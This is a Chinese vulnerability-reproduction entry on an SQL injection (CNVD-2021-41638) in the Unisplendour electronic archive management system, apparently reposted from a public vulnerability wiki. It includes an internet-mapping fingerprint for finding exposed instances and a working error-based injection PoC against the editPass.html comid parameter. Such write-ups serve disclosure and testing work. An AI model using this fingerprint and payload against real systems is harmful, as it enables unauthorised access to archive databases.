---
title: "紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638"
date: 2026-10-16 09:11:27
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "紫光档案管理系统"
tags:
  - "紫光档案管理系统"
  - "SQL注入"
  - "信息泄露"
  - "CNVD-2021-41638"
  - "漏洞复现"
---
## 漏洞描述

紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。

## 漏洞影响

```
紫光电子档案管理系统
```

## 网络测绘

```
app="紫光档案管理系统"
```

## 漏洞复现

登录页面

![image-20220525145742607](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251457947.png)

验证POC

```
/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251458637.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editPass.html-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CNVD-2021-41638.md)
